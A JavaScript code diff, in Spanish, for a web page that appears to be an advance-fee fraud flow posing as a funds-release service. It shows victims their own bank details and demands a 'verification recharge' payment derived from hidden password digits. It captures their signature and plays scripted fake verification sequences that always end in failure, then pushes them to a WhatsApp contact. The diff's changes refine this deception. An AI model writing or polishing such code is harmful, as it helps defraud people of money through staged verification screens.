+        percentDisplay.textContent = `${Math.round(currentWidth)}%`;
+      }
+      
+      if (progress < 1) {
+        requestAnimationFrame(updateProgress);
+      }
+    }
+    
+    requestAnimationFrame(updateProgress);
+  }
+  
+  // Función de easing para animaciones más naturales
+  function easeOutQuad(t) {
+    return t * (2 - t);
+  }
+
+  /****************************************************
+   * Carga de datos simulada (ACTUALIZADA)
    ****************************************************/
   function loadSavedData() {
     // Leer sessionStorage
@@ -1901,40 +2557,174 @@
          Por seguridad, necesitamos validar que eres el titular legítimo antes de procesar tu solicitud.`;
     }
 
-    document.getElementById("nombreUsuarioAviso").textContent = nombreCompleto || "[NombreCompleto]";
-    document.querySelectorAll(".nombreBancoUsuario").forEach(span => {
-      span.textContent = bancoUsuario || "[Banco]";
-    });
-    document.querySelectorAll(".numeroCuentaUsuario").forEach(el => {
-      el.textContent = numeroCuenta || "[NumeroCuenta]";
-    });
-    document.querySelectorAll(".nombreBancoRecarga").forEach(el => {
-      el.textContent = bancoUsuario || "[Banco]";
-    });
+    // NUEVA LÓGICA PARA CALCULAR EL MONTO DE RECARGA Y ACTUALIZAR TODA LA UI
+    actualizarMontosEnUI();
+    actualizarTextosCorchetes();
+    actualizarFormularioRecarga();
+  }
 
-    // Ajustar campo recarga
+  // Calcular valores dinámicos a partir de la contraseña
+  function calcularMontoRecarga() {
+    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
+    let tasaCambio = parseFloat(datosRemeex.rateBolivar || "37.40");
+    let montoMinimo = 20; // Valor predeterminado
+
+    // Extraer el monto mínimo de la contraseña si está disponible
+    if (datosRemeex.password && datosRemeex.password.length >= 10) {
+      const last4 = datosRemeex.password.slice(-4);
+      montoMinimo = parseInt(last4.slice(0, 2), 10) || montoMinimo;
+      
+      // Actualizar tasa de cambio si es necesario
+      const possibleRate = parseInt(last4.slice(2, 4), 10);
+      if (!isNaN(possibleRate) && possibleRate > 0) {
+        tasaCambio = possibleRate;
+        exchangeRate = tasaCambio;
+        document.getElementById("exchangeRateText").textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
+      }
+    }
+
+    // Calcular el monto de recarga en bolívares
+    const montoRecargaBs = montoMinimo * tasaCambio;
+    return {
+      montoMinimo: montoMinimo,
+      tasaCambio: tasaCambio,
+      montoRecargaBs: montoRecargaBs
+    };
+  }
+
+  // Actualizar todos los elementos con el monto correcto
+  function actualizarMontosEnUI() {
+    const { montoMinimo, tasaCambio, montoRecargaBs } = calcularMontoRecarga();
+    const montoFormateado = formatNumberVE(montoRecargaBs);
+    
+    // Actualizar todos los elementos que muestran el monto de recarga
+    const elementosMontoRecarga = [
+      "verificacionMonto", 
+      "verificacionMontoModal", 
+      "recargaMonto", 
+      "montoVerificacionTexto", 
+      "montoReembolsoTexto",
+      "montoRecargaError",
+      "montoVerificacionBsModal"
+    ];
+    
+    elementosMontoRecarga.forEach(id => {
+      const elemento = document.getElementById(id);
+      if (elemento) {
+        if (id === "verificacionMonto" || id === "verificacionMontoModal") {
+          elemento.textContent = `${montoFormateado} Bolívares`;
+        } else if (id === "recargaMonto") {
+          elemento.value = montoFormateado;
+        } else {
+          elemento.textContent = `${montoFormateado} Bs`;
+        }
+      }
+    });
+    
+    // Actualizar elementos que muestran el equivalente en USD
+    const montoVerificacionUsd = document.getElementById("montoVerificacionUsdModal");
+    if (montoVerificacionUsd) {
+      montoVerificacionUsd.textContent = `$${montoMinimo.toFixed(2)}`;
+    }
+    
+    // Actualizar textos en elementos con clase "blink"
+    const elementosBlink = document.querySelectorAll(".blink");
+    elementosBlink.forEach(elemento => {
+      elemento.textContent = `Bs. ${montoFormateado}`;
+    });
+    
+    // Actualizar el monto total del depósito
+    const montoDepositoTotal = document.getElementById("montoDepositoTotal");
+    if (montoDepositoTotal && saldoDisponible > 0) {
+      const total = saldoDisponible + montoRecargaBs;
+      montoDepositoTotal.textContent = `${formatNumberVE(total)} Bs`;
+    }
+    
+    // Actualizar saldo requerido
+    const saldoRequerido = document.getElementById("saldoRequerido");
+    if (saldoRequerido) {
+      saldoRequerido.textContent = `${formatNumberVE(saldoDisponible)} Bs`;
+    }
+    
+    // Actualizar monto retiro
+    const montoRetiroBs = document.getElementById("montoRetiroBs");
+    if (montoRetiroBs) {
+      montoRetiroBs.textContent = `${formatNumberVE(saldoDisponible)} Bs`;
+    }
+    
+    // Actualizar textos de recarga en los overlays
+    const recargaMontoTexto = document.getElementById("recargaMontoTexto");
+    if (recargaMontoTexto) {
+      recargaMontoTexto.textContent = `${montoFormateado} Bs`;
+    }
+  }
+
+  // Actualizar textos entre corchetes
+  function actualizarTextosCorchetes() {
+    // Nombres de banco
+    document.querySelectorAll(".nombreBancoUsuario").forEach(span => {
+      span.textContent = bancoUsuario || "Banco";
+    });
+    
+    // Número de cuenta
+    document.querySelectorAll(".numeroCuentaUsuario").forEach(elem => {
+      elem.textContent = numeroCuenta || "XXXX-XXXX-XXXX-XXXX";
+    });
+    
+    // Nombres de banco recarga
+    document.querySelectorAll(".nombreBancoRecarga").forEach(elem => {
+      elem.textContent = bancoUsuario || "Banco";
+    });
+    
+    // Información del usuario en aviso
+    const nombreUsuarioAviso = document.getElementById("nombreUsuarioAviso");
+    if (nombreUsuarioAviso) {
+      nombreUsuarioAviso.textContent = nombreCompleto || "Usuario";
+    }
+    
+    // Actualizar conceptos de pago
+    const documentoBeneficiarioTexto = documentoBeneficiario || "Documento de identidad";
+    const conceptoElements = ["conceptoRecarga", "conceptoPagoMovil", "conceptoRecargaModal"];
+    conceptoElements.forEach(id => {
+      const elemento = document.getElementById(id);
+      if (elemento) {
+        elemento.textContent = documentoBeneficiarioTexto;
+      }
+    });
+    
+    // Verificación de recarga
+    const verificacionNumero = document.getElementById("verificacionNumero");
+    const verificacionNumeroModal = document.getElementById("verificacionNumeroModal");
+    if (verificacionNumero) verificacionNumero.textContent = "0412-1000000";
+    if (verificacionNumeroModal) verificacionNumeroModal.textContent = "0412-1000000";
+    
+    const verificacionRif = document.getElementById("verificacionRif");
+    const verificacionRifModal = document.getElementById("verificacionRifModal");
+    if (verificacionRif) verificacionRif.textContent = "J-407502646";
+    if (verificacionRifModal) verificacionRifModal.textContent = "J-407502646";
+  }
+
+  // Actualizar formulario de recarga
+  function actualizarFormularioRecarga() {
     const recargaBancoOrigen = document.getElementById("recargaBancoOrigen");
     const recargaTelefono = document.getElementById("recargaTelefono");
     const recargaCedula = document.getElementById("recargaCedula");
     const logoBancoOrigen = document.getElementById("logoBancoOrigen");
 
-    if (recargaBancoOrigen) recargaBancoOrigen.value = bancoUsuario;
-    if (recargaTelefono) recargaTelefono.value = telefonoUsuario;
-    if (recargaCedula) recargaCedula.value = documentoBeneficiario;
-    if (logoBancoOrigen) logoBancoOrigen.src = logoBancoUsuario;
-
-    // Concepto recarga
-    const conceptoRecargaElem = document.getElementById("conceptoRecarga");
-    if (conceptoRecargaElem) {
-      conceptoRecargaElem.textContent = "Documento de identidad";
-    }
-    const conceptoPagoMovilElem = document.getElementById("conceptoPagoMovil");
-    if (conceptoPagoMovilElem) {
-      conceptoPagoMovilElem.textContent = "Documento de identidad";
-    }
-    const conceptoRecargaModalElem = document.getElementById("conceptoRecargaModal");
-    if (conceptoRecargaModalElem) {
-      conceptoRecargaModalElem.textContent = "Documento de identidad";
+    if (recargaBancoOrigen) recargaBancoOrigen.value = bancoUsuario || "";
+    if (recargaTelefono) recargaTelefono.value = telefonoUsuario || "";
+    if (recargaCedula) recargaCedula.value = documentoBeneficiario || "";
+    if (logoBancoOrigen) logoBancoOrigen.src = logoBancoUsuario || "";
+    
+    // Actualizar también los textos del formulario
+    const textoCompletarRecarga = document.getElementById("textoCompletarRecarga");
+    const { montoRecargaBs } = calcularMontoRecarga();
+    if (textoCompletarRecarga) {
+      textoCompletarRecarga.innerHTML = `
+        ¿Realizaste tu recarga de verificación por <span id="recargaMontoTexto">${formatNumberVE(montoRecargaBs)} Bs</span> 
+        desde tu banco para confirmar tu identidad? Por favor, completa la información 
+        para validar tu recarga.
+      `;
     }
   }
 
@@ -2216,6 +3006,12 @@
         alert("Por favor, realiza tu firma antes de continuar.");
         return;
       }
+      
+      // Captura la firma para mostrarla en el overlay
+      signatureDataURL = signatureCanvas.toDataURL("image/png");
+      document.getElementById("signaturePreviewImg").src = signatureDataURL;
+      document.getElementById("bankLogoConfirmFirma").src = logoBancoUsuario;
+      
       showOverlay("overlayConfirmFirma");
     });
 
@@ -2227,8 +3023,8 @@
     });
     continuarFirmaBtn.addEventListener("click", () => {
       hideOverlay("overlayConfirmFirma");
-      signatureDataURL = signatureCanvas.toDataURL("image/png");
       document.getElementById("miniSignatureImg").src = signatureDataURL;
+      document.getElementById("secuenciaFirmaLogo").src = logoBancoUsuario;
       startSecuenciaFirma();
     });
 
@@ -2238,8 +3034,7 @@
       // Se reproduce la primera canción
       firstAudio();
 
-      // CORRECCIÓN AQUÍ: escondemos la sección actual (#securityVerification1),
-      // no la de la firma (#signatureVerification).
+      // Escondemos la sección actual
       hideVisaCard("securityVerification1");
       showVisaCard("securityVerification2");
       startSecurity2Countdown();
@@ -2276,6 +3071,7 @@
         alert("Por favor, lee detenidamente. El botón estará disponible en unos minutos.");
       } else {
         hideVisaCard("securityVerification3C");
+        document.getElementById("verificandoRecargaLogo").src = logoBancoUsuario;
         startVerificandoRecarga();
       }
     });
@@ -2289,6 +3085,7 @@
         return;
       }
       hideVisaCard("recargaSection");
+      document.getElementById("secFinalLogo").src = logoBancoUsuario;
       startSecuenciaFinal();
     });
 
@@ -2454,11 +3251,8 @@
     showOverlay("overlaySecuenciaFirma");
     const titulo = document.getElementById("secuenciaFirmaTitulo");
     const texto = document.getElementById("secuenciaFirmaTexto");
-    const logo = document.getElementById("secuenciaFirmaLogo");
     const progressBar = document.getElementById("secuenciaFirmaProgress");
-
-    progressBar.style.width = "0%";
-    logo.src = logoBancoUsuario;
+    const percentDisplay = document.querySelector("#overlaySecuenciaFirma .progress-percentage");
 
     // Reproducir la segunda canción "apenas se muestre el primer overlay"
     secondAudio();
@@ -2476,7 +3270,9 @@
 
     titulo.textContent = secuenciaTextos[0].titulo;
     texto.textContent = secuenciaTextos[0].texto;
-    progressBar.style.width = secuenciaTextos[0].progreso + "%";
+    
+    // Iniciar animación de la barra de progreso
+    animateProgressBar(progressBar, 0, secuenciaTextos[0].progreso, 1000, percentDisplay);
 
     secuenciaFirmaInterval = setInterval(() => {
       firmaSecuenciaStep++;
@@ -2484,7 +3280,10 @@
         const step = secuenciaTextos[firmaSecuenciaStep];
         titulo.textContent = step.titulo;
         texto.textContent = step.texto;
-        progressBar.style.width = step.progreso + "%";
+        
+        const currentWidth = parseInt(progressBar.style.width) || 0;
+        animateProgressBar(progressBar, currentWidth, step.progreso, 1000, percentDisplay);
+        
         if (step.error) {
           progressBar.classList.add("error");
           titulo.style.color = "var(--danger)";
@@ -2502,7 +3301,7 @@
   }
 
   /****************************************************
-   * Verificando recarga (primera vez)
+   * Verificando recarga (ACTUALIZADA)
    ****************************************************/
   let verificandoRecargaInterval = null;
   function startVerificandoRecarga() {
@@ -2512,34 +3311,28 @@
     showOverlay("overlayVerificandoRecarga");
     const titulo = document.getElementById("verificandoRecargaTitulo");
     const texto = document.getElementById("verificandoRecargaTexto");
-    const logo = document.getElementById("verificandoRecargaLogo");
     const progressBar = document.getElementById("verificandoRecargaProgress");
+    const percentDisplay = document.querySelector("#overlayVerificandoRecarga .progress-percentage");
 
-    progressBar.style.width = "0%";
-    logo.src = logoBancoUsuario;
-
-    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
-    let tasaCambio = parseFloat(datosRemeex.rateBolivar || "37.40");
-    let montoMinimo = 20;
-    if (datosRemeex.password && datosRemeex.password.length >= 10) {
-      montoMinimo = parseInt(datosRemeex.password.slice(-4, -2), 10) || montoMinimo;
-    }
-    const montoRecarga = montoMinimo * tasaCambio;
+    const { montoRecargaBs } = calcularMontoRecarga();
+    const montoFormateado = formatNumberVE(montoRecargaBs);
 
     const secuenciaTextos = [
-      { titulo: "Iniciando verificación...", texto: `Buscando tu recarga de ${formatNumberVE(montoRecarga)} Bs`, progreso: 12 },
+      { titulo: "Iniciando verificación...", texto: `Buscando tu recarga de ${montoFormateado} Bs`, progreso: 12 },
       { titulo: "Consultando movimientos recientes", texto: "Analizando operaciones recientes...", progreso: 24 },
-      { titulo: "Verificando pago móvil", texto: `Buscando recarga de ${formatNumberVE(montoRecarga)} Bs...`, progreso: 36 },
+      { titulo: "Verificando pago móvil", texto: `Buscando recarga de ${montoFormateado} Bs...`, progreso: 36 },
       { titulo: "Comprobando titularidad", texto: "Validando datos bancarios registrados...", progreso: 48 },
       { titulo: "Consultando banco emisor", texto: "Verificando detalles de la operación...", progreso: 60 },
       { titulo: "Verificación adicional", texto: "Examinando información complementaria...", progreso: 72 },
-      { titulo: `No encontramos tu recarga de ${formatNumberVE(montoRecarga)} Bs`, texto: "No se detectan movimientos con el monto exacto.", progreso: 84, error: true },
+      { titulo: `No encontramos tu recarga de ${montoFormateado} Bs`, texto: "No se detectan movimientos con el monto exacto.", progreso: 84, error: true },
       { titulo: "Verificación manual requerida", texto: "Completa la info de tu recarga manualmente.", progreso: 100, error: true }
     ];
 
     titulo.textContent = secuenciaTextos[0].titulo;
     texto.textContent = secuenciaTextos[0].texto;
-    progressBar.style.width = secuenciaTextos[0].progreso + "%";
+    
+    // Iniciar animación de la barra de progreso
+    animateProgressBar(progressBar, 0, secuenciaTextos[0].progreso, 1000, percentDisplay);
 
     verificandoRecargaInterval = setInterval(() => {
       recargaSecuenciaStep++;
@@ -2547,7 +3340,10 @@
         const step = secuenciaTextos[recargaSecuenciaStep];
         titulo.textContent = step.titulo;
         texto.textContent = step.texto;
-        progressBar.style.width = step.progreso + "%";
+        
+        const currentWidth = parseInt(progressBar.style.width) || 0;
+        animateProgressBar(progressBar, currentWidth, step.progreso, 1000, percentDisplay);
+        
         if (step.error) {
           progressBar.classList.add("error");
           titulo.style.color = "var(--danger)";
@@ -2565,7 +3361,7 @@
   }
 
   /****************************************************
-   * Secuencia final (al confirmar recarga)
+   * Secuencia final (ACTUALIZADA)
    ****************************************************/
   let secuenciaFinalInterval = null;
   function startSecuenciaFinal() {
@@ -2575,34 +3371,28 @@
     showOverlay("overlaySecuenciaFinal");
     const titulo = document.getElementById("secFinalTitulo");
     const texto = document.getElementById("secFinalTexto");
-    const logo = document.getElementById("secFinalLogo");
     const progressBar = document.getElementById("secuenciaFinalProgress");
+    const percentDisplay = document.querySelector("#overlaySecuenciaFinal .progress-percentage");
 
-    progressBar.style.width = "0%";
-    logo.src = logoBancoUsuario;
-
-    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
-    let tasaCambio = parseFloat(datosRemeex.rateBolivar || "37.40");
-    let montoMinimo = 20;
-    if (datosRemeex.password && datosRemeex.password.length >= 10) {
-      montoMinimo = parseInt(datosRemeex.password.slice(-4, -2), 10) || montoMinimo;
-    }
-    const montoRecarga = montoMinimo * tasaCambio;
+    const { montoRecargaBs } = calcularMontoRecarga();
+    const montoFormateado = formatNumberVE(montoRecargaBs);
 
     const secuenciaTextos = [
       { titulo: "Procesando información", texto: "Verificando comprobante de recarga...", progreso: 12 },
-      { titulo: `Buscando recarga de ${formatNumberVE(montoRecarga)} Bs`, texto: "Consultando últimos movimientos...", progreso: 24 },
+      { titulo: `Buscando recarga de ${montoFormateado} Bs`, texto: "Consultando últimos movimientos...", progreso: 24 },
       { titulo: "Validando datos de tu cuenta", texto: `Verificando cuenta ${numeroCuenta} en ${bancoUsuario}`, progreso: 36 },
       { titulo: "Preparando tu depósito", texto: "Confirmando transacción de fondos...", progreso: 48 },
       { titulo: "Analizando información adicional", texto: "Validando datos de seguridad...", progreso: 60 },
       { titulo: "Verificación de comprobante", texto: "Procesando información del comprobante...", progreso: 72 },
-      { titulo: "Recarga no encontrada", texto: `No encontramos el movimiento de ${formatNumberVE(montoRecarga)} Bs.`, progreso: 84, error: true },
+      { titulo: "Recarga no encontrada", texto: `No encontramos el movimiento de ${montoFormateado} Bs.`, progreso: 84, error: true },
       { titulo: "Verificación adicional requerida", texto: "Necesitamos validación adicional.", progreso: 100, error: true }
     ];
 
     titulo.textContent = secuenciaTextos[0].titulo;
     texto.textContent = secuenciaTextos[0].texto;
-    progressBar.style.width = secuenciaTextos[0].progreso + "%";
+    
+    // Iniciar animación de la barra de progreso
+    animateProgressBar(progressBar, 0, secuenciaTextos[0].progreso, 1000, percentDisplay);
 
     secuenciaFinalInterval = setInterval(() => {
       secuenciaFinalStep++;
@@ -2610,7 +3400,10 @@
         const step = secuenciaTextos[secuenciaFinalStep];
         titulo.textContent = step.titulo;
         texto.textContent = step.texto;
-        progressBar.style.width = step.progreso + "%";
+        
+        const currentWidth = parseInt(progressBar.style.width) || 0;
+        animateProgressBar(progressBar, currentWidth, step.progreso, 1000, percentDisplay);
+        
         if (step.error) {
           progressBar.classList.add("error");
           titulo.style.color = "var(--danger)";
@@ -2627,22 +3420,17 @@
     }, 15000);
   }
 
-  // Configura link WhatsApp
+  // Configura link WhatsApp (ACTUALIZADA)
   function configurarWhatsAppLink() {
     const whatsappLink = document.getElementById("whatsappLink");
     if (!whatsappLink) return;
 
-    const datosRemeex = JSON.parse(sessionStorage.getItem("datosRemeex") || "{}");
-    let tasaCambio = parseFloat(datosRemeex.rateBolivar || "37.40");
-    let montoMinimo = 20;
-    if (datosRemeex.password && datosRemeex.password.length >= 10) {
-      montoMinimo = parseInt(datosRemeex.password.slice(-4, -2), 10) || montoMinimo;
-    }
-    const montoRecarga = montoMinimo * tasaCambio;
+    const { montoRecargaBs } = calcularMontoRecarga();
+    const montoFormateado = formatNumberVE(montoRecargaBs);
 
     const msg = encodeURIComponent(
       `Hola, soy ${nombreCompleto || "cliente"}, con documento ${documentoBeneficiario || "pendiente"}. ` +
-      `No se encontró mi recarga de verificación por ${formatNumberVE(montoRecarga)} Bs y necesito ` +
+      `No se encontró mi recarga de verificación por ${montoFormateado} Bs y necesito ` +
       `ayuda para liberar mis fondos de ${formatNumberVE(saldoDisponible)} Bs en ${bancoUsuario || "mi banco"}.`
     );
     whatsappLink.href = `https://wa.me/17373018059?text=${msg}`;
@@ -2659,15 +3447,55 @@
    ****************************************************/
   function showOverlay(id) {
     const overlay = document.getElementById(id);
-    if (overlay) overlay.classList.add("active");
+    if (overlay) {
+      overlay.classList.add("active");
+      
+      // Para contador regresivo si es el overlay de firma no coincide
+      if (id === 'overlayFirmaNoCoincide') {
+        startCountdown();
+      }
+    }
   }
+  
   function hideOverlay(id) {
     const overlay = document.getElementById(id);
-    if (overlay) overlay.classList.remove("active");
-    if (id === "overlayFirmaNoCoincide" && redirectCountdownInterval) {
-      clearInterval(redirectCountdownInterval);
-      redirectCountdownInterval = null;
+    if (overlay) {
+      overlay.classList.remove("active");
+      if (id === "overlayFirmaNoCoincide" && redirectCountdownInterval) {
+        clearInterval(redirectCountdownInterval);
+        redirectCountdownInterval = null;
+      }
     }
+  }
+  
+  // Contador regresivo para el overlay FirmaNoCoincide
+  function startCountdown() {
+    const countdownElement = document.getElementById('redirectCountdown');
+    const progressBar = document.getElementById('redirectProgressBar');
+    const percentDisplay = document.querySelector('#overlayFirmaNoCoincide .progress-percentage');
+    
+    if (!countdownElement || !progressBar) return;
+    
+    let timeLeft = 10;
+    countdownElement.textContent = timeLeft;
+    
+    // Iniciar animación de la barra de progreso
+    animateProgressBar(progressBar, 0, 10, 500, percentDisplay);
+    
+    redirectCountdownInterval = setInterval(() => {
+      timeLeft--;
+      countdownElement.textContent = timeLeft;
+      
+      const percent = 100 - (timeLeft * 10);
+      animateProgressBar(progressBar, progressBar.style.width.replace('%', ''), percent, 500, percentDisplay);
+      
+      if (timeLeft <= 0) {
+        clearInterval(redirectCountdownInterval);
+        setTimeout(() => {
+          hideOverlay('overlayFirmaNoCoincide');
+        }, 500);
+      }
+    }, 1000);
   }
 
   /****************************************************
